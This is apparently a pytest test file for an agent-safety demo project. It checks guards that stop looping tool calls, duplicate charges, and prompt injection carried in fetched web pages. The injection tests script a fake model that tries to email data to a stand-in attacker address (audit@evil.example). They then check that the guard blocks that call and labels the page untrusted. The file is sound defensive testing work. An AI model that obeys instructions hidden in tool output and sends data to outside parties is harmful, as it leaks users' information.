import json

import pytest

from agent_failure_lab.errors import LiveModeUnavailableError
from fakes import FakeChatClient, raw_call, reply
from loader import load_module

CUSTOMER = "jane@example.com"
ATTACKER = "audit@evil.example"


def _arguments(**values: str) -> str:
    return json.dumps(values)


def test_the_hand_written_loop_runs_to_the_limit_without_guards_and_stops_with_them(
    capsys: pytest.CaptureFixture[str],
) -> None:
    example = load_module("examples/using_guards_in_your_loop.py", "example_own_loop")

    example.main()

    output = capsys.readouterr().out
    assert "Without guards: ran all 12 steps and made 12 real tool calls" in output
    assert "With guards:    stopped: loop detected" in output
    assert "LoopDetector: blocked a repeated call to lookup_order" in output


def test_the_langgraph_port_charges_twice_without_the_guard_and_once_with_it() -> None:
    pytest.importorskip("langgraph")
    example = load_module("examples/langgraph_duplicate_side_effect.py", "example_langgraph")

    assert example.charges_for(protected=False) == 2
    assert example.charges_for(protected=True) == 1


def test_the_openai_loop_blocks_the_hidden_instruction_and_still_emails_the_customer() -> None:
    example = load_module("examples/openai_loop_tool_output_injection.py", "example_openai")
    client = FakeChatClient(
        [
            reply(calls=[raw_call("c1", "fetch_page", _arguments(url="https://shop.example/x"))]),
            reply(calls=[raw_call("c2", "send_email", _arguments(to=ATTACKER, body="list"))]),
            reply(calls=[raw_call("c3", "send_email", _arguments(to=CUSTOMER, body="summary"))]),
            reply("Done."),
        ]
    )

    recipients = example.run_agent(client, "fake-model")

    assert recipients == [CUSTOMER]
    blocked = [m for m in client.requests[-1]["messages"] if m.get("tool_call_id") == "c2"]
    assert blocked
    assert "email sent" not in blocked[0]["content"]


def test_the_openai_loop_labels_the_fetched_page_as_untrusted() -> None:
    example = load_module("examples/openai_loop_tool_output_injection.py", "example_openai_label")
    client = FakeChatClient(
        [
            reply(calls=[raw_call("c1", "fetch_page", _arguments(url="https://shop.example/x"))]),
            reply("Done."),
        ]
    )

    example.run_agent(client, "fake-model")

    page = next(m for m in client.requests[-1]["messages"] if m.get("tool_call_id") == "c1")
    assert "untrusted" in page["content"]
    assert ATTACKER in page["content"]


def test_the_openai_loop_prints_the_outcome(capsys: pytest.CaptureFixture[str]) -> None:
    example = load_module("examples/openai_loop_tool_output_injection.py", "example_openai_main")
    client = FakeChatClient(
        [
            reply(calls=[raw_call("c1", "send_email", _arguments(to=CUSTOMER, body="summary"))]),
            reply("Done."),
        ]
    )

    example.main(client=client, model="fake-model")

    output = capsys.readouterr().out
    assert f"Emails were sent to: {CUSTOMER}" in output
    assert "The hidden instruction was blocked." in output


def test_the_openai_loop_explains_itself_when_live_mode_is_not_set_up(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    example = load_module("examples/openai_loop_tool_output_injection.py", "example_openai_off")
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)

    def unavailable() -> None:
        raise LiveModeUnavailableError("OPENAI_API_KEY is not set.")

    monkeypatch.setattr(example, "create_client", unavailable)

    with pytest.raises(SystemExit) as stopped:
        example.main()

    assert stopped.value.code == 1
    assert "Cannot run this example: OPENAI_API_KEY is not set." in capsys.readouterr().out
